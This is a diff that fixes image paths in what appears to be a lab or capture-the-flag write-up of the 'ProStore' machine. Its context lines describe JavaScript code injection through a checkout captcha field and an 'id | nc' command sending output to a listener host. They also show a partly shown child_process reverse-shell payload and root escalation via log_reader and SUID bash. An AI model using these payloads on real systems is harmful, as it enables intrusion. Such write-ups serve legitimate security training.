@@ -106,7 +106,7 @@ It revealed some results but nothing terribly helpful:
 
 #### Nikto
 
-<figure><img src="../.gitbook/assets/ProStore-Nikto.png" alt=""><figcaption><p>Nikto scan results</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-Nikto.png" alt=""><figcaption><p>Nikto scan results</p></figcaption></figure>
 
 The `wp-config.php` seems to have been a false positive
 
@@ -122,7 +122,7 @@ Since nothing appears vulnerable to a simple RCE exploit I must try some other m
 
 The checkout page can be accessed with a logged in account:
 
-<figure><img src="../.gitbook/assets/ProStore-CheckoutPage.png" alt=""><figcaption><p>Checkout page</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-CheckoutPage.png" alt=""><figcaption><p>Checkout page</p></figcaption></figure>
 
 While completing the checkout I attempt to throw some characters in fields for SQLi such as `'"#$;` but none of this was fruitful. Once I went back to Burp to see what I had done I found something.
 
@@ -130,19 +130,19 @@ While completing the checkout I attempt to throw some characters in fields for S
 
 At first I missed the inject-able parameter because I was running it in the browser but upon closer examination I found the extra field:
 
-<figure><img src="../.gitbook/assets/ProStore-CheckoutBurp.png" alt=""><figcaption><p>captcha is added</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-CheckoutBurp.png" alt=""><figcaption><p>captcha is added</p></figcaption></figure>
 
 I start messing with this. First I type another number (`1`) and get a captcha error:
 
-<figure><img src="../.gitbook/assets/ProStore-CaptchaError.png" alt=""><figcaption><p>Captcha error</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-CaptchaError.png" alt=""><figcaption><p>Captcha error</p></figcaption></figure>
 
 I try a string `abc`:
 
-<figure><img src="../.gitbook/assets/ProStore-ReferenceError.png" alt=""><figcaption><p>Reference error</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-ReferenceError.png" alt=""><figcaption><p>Reference error</p></figcaption></figure>
 
 After some googling it turns out this is just what happens when a non-existent variable is referenced in JavaScript. This indicates this code is being executed. To test this theory I place `3*1` in the `captcha=` field:
 
-<figure><img src="../.gitbook/assets/ProStore-OrderSuccess.png" alt=""><figcaption><p>Thanks for shopping page</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-OrderSuccess.png" alt=""><figcaption><p>Thanks for shopping page</p></figcaption></figure>
 
 &#x20;It redirects to the "Thanks for shopping!" page which indicates the field executed successfully. I try some other things with various results:
 
@@ -169,11 +169,11 @@ id | nc 192.168.45.234 80
 
 In the request this is modified with `+` for spaces:
 
-<figure><img src="../.gitbook/assets/ProStore-CodeExecutionRequest.png" alt=""><figcaption><p>Test execution request</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-CodeExecutionRequest.png" alt=""><figcaption><p>Test execution request</p></figcaption></figure>
 
 I start a listener and submit the request. Success:
 
-<figure><img src="../.gitbook/assets/ProStore-NcPocListener.png" alt=""><figcaption><p>Command retrieved</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-NcPocListener.png" alt=""><figcaption><p>Command retrieved</p></figcaption></figure>
 
 * Some trial and error was needed to find port `80` as it was the only one I could get this working on (tried `22` and `8000`)it,&#x20;
 
@@ -211,9 +211,9 @@ require('child_process').exec('rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2F
 
 And submitted with Burp creating a shell:
 
-<figure><img src="../.gitbook/assets/ProStore-ShellRequest.png" alt=""><figcaption><p>Burp shell request</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-ShellRequest.png" alt=""><figcaption><p>Burp shell request</p></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/ProStore-FootholdShell.png" alt=""><figcaption><p>Listener catching incoming shell</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-FootholdShell.png" alt=""><figcaption><p>Listener catching incoming shell</p></figcaption></figure>
 
 User access achieved as `observer`.
 
@@ -245,7 +245,7 @@ In the linPEAS output's "Useful Software" section it was noted that [`gdb`](http
 
 I started the binary with `gdb` is stating that it cannot find the source code file:
 
-<figure><img src="../.gitbook/assets/ProStore-gdbOutput.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-gdbOutput.png" alt=""><figcaption></figcaption></figure>
 
 Since it was likely moved out of the `/tmp` directory I decide to search around a bit:
 
@@ -340,7 +340,7 @@ Hopefully causing the program to execute:
 
 This worked:
 
-<figure><img src="../.gitbook/assets/ProStore-LogReaderCommand.png" alt=""><figcaption><p>Output of the attempt</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-LogReaderCommand.png" alt=""><figcaption><p>Output of the attempt</p></figcaption></figure>
 
 Even better it seems the command is executed in the context of the `root` user.
 
@@ -370,7 +370,7 @@ This can be dine via the `log_reader` binary:
 
 At which point the user can simply use `sudo` for anything:
 
-<figure><img src="../.gitbook/assets/ProStore-PE1.png" alt=""><figcaption><p>sudo privilege escalation vector</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-PE1.png" alt=""><figcaption><p>sudo privilege escalation vector</p></figcaption></figure>
 
 #### Modifying an Existing Binary
 
@@ -396,7 +396,7 @@ Then the [GTFOBins technique](https://gtfobins.github.io/gtfobins/bash/#suid) of
 
 This also worked:
 
-<figure><img src="../.gitbook/assets/ProStore-PE2.png" alt=""><figcaption><p>Elevated privileges via bash</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/ProStore-PE2.png" alt=""><figcaption><p>Elevated privileges via bash</p></figcaption></figure>
 
 Machine completed!
 
